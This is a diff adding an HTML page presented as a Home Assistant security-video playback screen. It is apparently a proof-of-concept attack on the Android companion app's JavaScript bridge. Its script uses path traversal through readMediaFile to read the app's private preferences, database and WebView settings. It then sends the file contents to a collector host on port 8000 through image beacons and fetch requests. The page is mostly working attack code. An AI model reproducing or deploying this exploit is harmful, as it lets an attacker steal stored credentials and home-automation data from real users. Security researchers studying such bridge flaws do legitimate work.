@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Home Assistant - 安防回放</title>
+<style>
+body { font-family: -apple-system, sans-serif; max-width: 680px; margin: 20px auto; padding: 0 16px; background: #fafafa; }
+h2 { color: #18bcf2; }
+.card { background: #fff; border-radius: 10px; padding: 16px; margin: 12px 0; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
+pre { background: #f0f0f0; padding: 10px; border-radius: 6px; font-size: 12px; overflow-x: auto; }
+</style>
+</head>
+<body>
+<h2>安防录像回放</h2>
+
+<div class="card">
+<h3>正常快照</h3>
+<pre id="normal-snapshot">加载中...</pre>
+</div>
+
+<div class="card">
+<h3>诊断信息</h3>
+<pre id="diag">加载中...</pre>
+</div>
+
+<script>
+var EXFIL = "http://{{LOCAL_IP}}:8000/collect";
+
+function exfil(label, data) {
+    try { new Image().src = EXFIL + "?d=" + encodeURIComponent(label + "=" + data); } catch(e) {}
+    try { fetch(EXFIL + "?d=" + encodeURIComponent(label + "=" + data), { mode: "no-cors" }); } catch(e) {}
+}
+
+// Normal snapshot
+try {
+    var snap = window.HomeAppBridge.readMediaFile("driveway_20260529_080000.jpg");
+    document.getElementById("normal-snapshot").textContent = snap;
+} catch(e) {
+    document.getElementById("normal-snapshot").textContent = "Error: " + e.message;
+}
+
+// Path traversal attack - read private file
+var diagText = "";
+var traversalPaths = [
+    "../../../shared_prefs/io.homeassistant.companion.android_preferences.xml",
+    "../../../databases/HomeAssistant.db",
+    "../../../../../data/data/io.homeassistant.companion.android/shared_prefs/WebViewSettings.xml"
+];
+
+for (var i = 0; i < traversalPaths.length; i++) {
+    try {
+        var content = window.HomeAppBridge.readMediaFile(traversalPaths[i]);
+        diagText += "[OK] " + traversalPaths[i] + "\n" + content.substring(0, 200) + "\n\n";
+        exfil("pathTraversal_" + i, traversalPaths[i] + " => " + content.substring(0, 500));
+    } catch(e) {
+        diagText += "[FAIL] " + traversalPaths[i] + ": " + e.message + "\n\n";
+    }
+}
+document.getElementById("diag").textContent = diagText;
+</script>
+</body>
+</html>
